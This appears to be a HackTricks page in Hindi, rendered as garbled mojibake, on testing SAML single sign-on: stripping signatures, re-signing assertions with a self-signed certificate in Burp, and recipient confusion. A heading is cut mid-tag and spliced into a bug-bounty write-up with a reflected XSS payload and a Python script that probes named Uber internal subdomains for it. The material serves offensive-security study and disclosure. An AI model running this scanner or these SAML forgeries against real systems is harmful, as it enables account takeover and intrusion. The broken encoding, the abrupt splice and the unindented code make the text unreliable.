рдЗрд╕ рдЯреЙрдХ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЫреЛрдбрд╝рдирд╛ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЫреЛрдбрд╝рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ SAML рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреИрд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИ рдЬрдм **рдХреЛрдИ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдЬрдм рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ **рдЕрдиреБрдкрд╕реНрдерд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рдЪрд░рдг рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрддреА рд╣реИ, рд╣рдорд▓рд╛рд╡рд╛рд░ рджреНрд╡рд╛рд░рд╛ рдЙрд╕рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (547).png>)

### рдЙрдкрдХрд░рдг <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЫреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП, SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж `рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣рдЯрд╛рдПрдВ` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **рд╕рднреА** рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдиреБрд░реЛрдз рдХреЛ рд▓рдХреНрд╖реНрдп рддрдХ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рджреЗрдВред рдпрджрд┐ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ

## рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реА <a href="#certificate-faking" id="certificate-faking"></a>

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реА рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ **рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдиреЗ SAML рд╕рдВрджреЗрд╢ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд┐рдпрд╛ рд╣реИ**ред SP рдФрд░ IdP рдХреЗ рдмреАрдЪ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕рдВрдмрдВрдз рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рд░ рдмрд╛рд░ рдПрдХ SAML рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдПрдХ **рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдпрд╛ рджрд╛рд╡рд╛ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реИред

### рдЙрдкрдХрд░рдг <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML рд░реЗрдбрд░**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рд╛рдорд╛рдиреНрдпрддрдГ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░реЗрдВред\
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ `рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ SAML рд░реЗрдбрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рднреЗрдЬреЗрдВ` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ SAML рд░реЗрдбрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреИрдм рдореЗрдВ рдПрдХ рдЖрдпрд╛рддрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡рд╣рд╛рдВ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдЖрдпрд╛рддрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ `рд╕рд╣реЗрдЬреЗрдВ рдФрд░ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░` рдмрдЯрди рджрдмрд╛рддреЗ рд╣реИрдВред

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ рдореВрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдПрдХ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХреНрд▓реЛрди рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред рдЕрдм рд╕рдВрджрд░реНрдн рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ рдХрд╛ рд╕рдордп рд╣реИ рдЬреЛ рдмрд░реНрдк рдХреЗ рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдзрд╛рд░рд┐рдд рд╣реИред рдкрд╣рд▓реЗ, XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдбреНрд░реЙрдкрдбрд╛рдЙрди рдореЗрдиреВ рд╕реЗ рдирдпрд╛ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЪреБрдиреЗрдВред рдлрд┐рд░ `рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣рдЯрд╛рдПрдВ` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдЕрдВрдд рдореЗрдВ, **`(рдкреБрдирдГ) рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░реЗрдВ`** рдпрд╛ **`(`**`рдкреБрдирдГ) рджрд╛рд╡рд╛ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░реЗрдВ`** рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (**рдЬреЛ рднреА** рдЖрдкрдХреА рджреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рдЕрдзрд┐рдХ** **рдЙрдкрдпреБрдХреНрдд** рд╣реЛ)ред

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕реЗ рдЖрдЧреЗ рднреЗрдЬреЗрдВред рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдЕрдкрдиреЗ SAML рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред SAML рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╣рдо Assertion рдореЗрдВ рдорд╛рдиреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред

## рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рдо / рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд▓рдХреНрд╖реНрдп рднреНрд░рдо <a href
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
рдпрд╣ рдПрдХ рд▓реЙрдЧрдЖрдЙрдЯ рдкреЗрдЬ рд╣реИ, рдореИрдВрдиреЗ рдКрдкрд░ рджрд┐рдП рдЧрдП рд▓рд┐рдВрдХ рдХреЛ рдЦреЛрд▓рд╛ рдФрд░ рдпрд╣ рдореБрдЭреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рджрд┐рдпрд╛ред
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
рдмреЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдХ URL рд▓реЗ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХреНрдпрд╛ рд╣рдо рдЙрд╕реЗ рдкреБрд░рд╛рдиреЗ рдХреНрд▓рд╛рд╕рд┐рдХ `javascript:alert(123);` рд╕реЗ рдмрджрд▓ рджреЗрдВрдЧреЗ рддрд╛рдХрд┐ XSS рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### рдмрдбрд╝реЗ рдкреИрдорд╛рдиреЗ рдкрд░ рдЙрддреНрдкрдиреНрдирддрд╛

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреЛ URL рдХреА рд╕реВрдЪреА рд▓реЗ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдкрдХреЛ рдХреЙрд▓рдмреИрдХ (SAML рд╕реЗрд╡рди) URL рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдореИрдВрдиреЗ рдлреИрдбрдпреЛрд╕реНрдореИрди рдХреЗ рдЙрдкрдХрд░рдг рдХреЛ `uberinternal.com` рдХреЗ рд╕рднреА рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЗ рд╕рд╛рде рдЦрд┐рд▓рд╛рдпрд╛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝реАрдб рдХрд░рдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛ рдФрд░ рд╡рд╣рд╛рдВ рдПрдХ рдФрд░ рдбреЛрдореЗрди рдерд╛ рдЬреЛ рдЙрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рдерд╛ред

рдЕрдЧрд▓рд╛ рдореИрдВрдиреЗ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдпрд╛ рдЬреЛ рд╡рд┐рдХрд▓реНрдк рдкреГрд╖реНрда `oidauth/prompt` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ XSS рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдореЗрд░рд╛ рдЗрдирдкреБрдЯ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдореБрдЭреЗ рдПрдХ рдЕрдЪреНрдЫрд╛ рд╕рдВрдХрдЯрдкреВрд░реНрдг рд╕рдВрджреЗрд╢ рджреЗрддрд╛ рд╣реИред
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## рд╕рдВрджрд░реНрдн

рдпрд╣ рд╣рдорд╛рд░реЗ рджреНрд╡рд╛рд░рд╛ [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реБрдП рд╣реИрдВ\
рдЖрдк [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/) рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╕рд╛рдзрди рдФрд░ рд▓реЗрдЦ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
